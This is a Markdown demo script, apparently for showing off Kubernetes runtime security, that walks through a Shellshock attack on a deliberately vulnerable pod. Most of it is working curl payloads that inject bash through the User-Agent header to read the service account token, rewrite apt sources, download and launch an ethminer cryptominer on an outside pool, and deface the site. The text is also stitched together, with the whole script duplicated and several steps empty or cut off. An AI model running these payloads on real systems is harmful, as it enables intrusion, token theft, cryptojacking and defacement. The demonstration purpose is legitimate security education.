# Initial Access to Credential Discovery to Privledge escalation and Impact

This demonstration will showcase initial access as part of the MITRE ATT&CK framework. This will showcase Exploition of a Public-Facing Application insight of a container image and 


This demo will also showcase practical security controls with a focus on runtime security controls. 

## What is shellshock?

Improper input validation bash code allowed users to put trailing commands after the definition of environment variables. 

You read this and first think - what uses environment variables.....crap. TONS OF THINGS! SSH, Apache modules, etc.

This meant remote code execution on apaches mod_cgi(d) library used in web servers.

CGI stands for Common Gateway Interface. It is a way to let Apache execute script files and send the
output to the client. So we just need something that will use bash.

## High Level Workflow

1. Set up Red Hat Advanced Cluster Security
2. 

# Demo Script


## Setup

This setup will provide the foundational layer and jumping point from which you will attck Kubernetes. It will also deploy a target pod that we will move to in order to steal sensitive data. 


### Deploy Vulnerable Pod for Initial Access

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode. (You will actually be hacked if running in privledged mode and publically expose this)* It's reccomended that when using this you only port forward.


1. Deploy a vulnerable pod based on the vulnerables docker repo shellshock vulnerability. This will be our initial access point for the attack. 

```
kubectl run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default
```

```
oc exec -it shellshock -- sh 
```

Cheat so you have permissions:

```
chmod 777 -R  /
```

```
chown www-data:www-data -R /
```

```
Exit
```


2. Port forward to the pod so that you don't expose a pod vulnerable to shellshock to a network attack vector. 

```
kubectl port-forward shellshock 8080:80 -n default &
```

3. Deploy our target pod with sensitive data.

## Prelude 

You are playing the role of an attacker targeting an externally facing website. 

1. 

### Weaponization and delivery

3. Test to ensure that you can exploit

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo "pwnage"'" \
http://localhost:8080/cgi-bin/vulnerable
```

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'" \ 
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'" \ 
http://localhost:8080/cgi-bin/vulnerable

But I don't want to stop there. Even though I let them know I'm in their computer I need to actually be in their computer. 

So I've had a bit of time to explore this containers architecture


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /etc/apt/sources.list'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'printf "deb http://archive.debian.org/debian wheezy main\ndeb http://security.debian.org/debian-security wheezy/updates main\n" >> /etc/apt/sources.list'" \
http://localhost:8080/cgi-bin/vulnerable

Update the 

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'apt-get update'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'apt-get install wget curl oc -y'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /tmp'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz'" \
http://localhost:8080/cgi-bin/vulnerable


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'tar -xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/bin/ethminer --farm-retries 9999 -U --farm-recheck -P stratum1+ssl://ETH_WALLET.WORKERNAME@us2.ethermine.org:5555
'" \
http://localhost:8080/cgi-bin/vulnerable


### Exploitation

6. Time to mess with people by defacing their website with cat pictures

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I used your computer but at leasst I knocked</h1><body><img src=https://i.redd.it/v5cingisv6p01.jpg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
```



export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)


Then because I'm a nice person I'm going to deface the site.

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>Cat memes are the most important thing in the world.</h1><body><img src=https://i.redd.it/v5cingisv6p01.jpg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
```

# Initial Access to Credential Discovery to Privledge escalation and Impact

This demonstration will showcase initial access as part of the MITRE ATT&CK framework. This will showcase Exploition of a Public-Facing Application insight of a container image and 


This demo will also showcase practical security controls with a focus on runtime security controls. 

## Offensive Objectives:

1. Get initial access to a container by exploiting an external application
2. Get access to the Kubernetes API server
3. Retrieve the sensitive data on the node
4. Start cryptomining on the site you compromised
5. Deface the site to let everyone know you care.


## High Level Workflow

1. Set up Red Hat Advanced Cluster Security
2. Place sensitivedata.txt on the node prior to the demo.

## Setup

This setup will provide the foundational layer and jumping point from which you will attck Kubernetes. It will also deploy a target pod that we will move to in order to steal sensitive data. 


### Deploy Vulnerable Pod for Initial Access

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode. (You will actually be hacked if running in privledged mode and publically expose this)* It's reccomended that when using this you only port forward.


1. Deploy a vulnerable pod based on the vulnerables docker repo shellshock vulnerability. This will be our initial access point for the attack. 

sed -i "s/server_name[^;]*;/server_name $publicip $publicdns;/" /etc/nginx/nginx.conf


```
oc run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default
```

2. Port forward to the pod so that you don't expose a pod vulnerable to shellshock to a network attack vector. 

```
kubectl port-forward shellshock 8080:80 -n default &
```

#### What is shellshock?

Improper input validation bash code allowed users to put trailing commands after the definition of environment variables. 

You read this and first think - what uses environment variables.....crap. TONS OF THINGS! SSH, Apache modules, etc.

This meant remote code execution on apaches mod_cgi(d) library used in web servers.

CGI stands for Common Gateway Interface. It is a way to let Apache execute script files and send the
output to the client. So we just need something that will use bash.


### Obtain Initial Access

1. Inspect the website at https://localhost:8080. Notice that it is vulnerable to shellshock. 


2. Test to ensure that you can exploit the shellshock vulnerability

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" \
http://localhost:8080/cgi-bin/vulnerable

```

I'm first going to search the environment variables to find out more about my environment
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo "pwnage"'" \
http://localhost:8080/cgi-bin/vulnerable

```

But I don't want to stop there. Even though I let them know I'm in their computer I need to actually be in their computer. 

So I've had a bit of time to explore this containers architecture


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /etc/apt/sources.list'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'printf "deb http://archive.debian.org/debian wheezy main\ndeb http://security.debian.org/debian-security wheezy/updates main\n" >> /etc/apt/sources.list'" \
http://localhost:8080/cgi-bin/vulnerable

Update the 

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'apt-get update'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'apt-get install wget curl oc -y'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /tmp'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz'" \
http://localhost:8080/cgi-bin/vulnerable


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'tar -xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/bin/ethminer --farm-retries 9999 -U --farm-recheck -P stratum1+ssl://ETH_WALLET.WORKERNAME@us2.ethermine.org:5555
'" \
http://localhost:8080/cgi-bin/vulnerable


### Exploitation

6. Time to mess with people by defacing their website with cat pictures

```
  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>Cat memes are the most important thing in the world.</h1><body><img src=https://i.redd.it/v5cingisv6p01.jpg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
```




export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
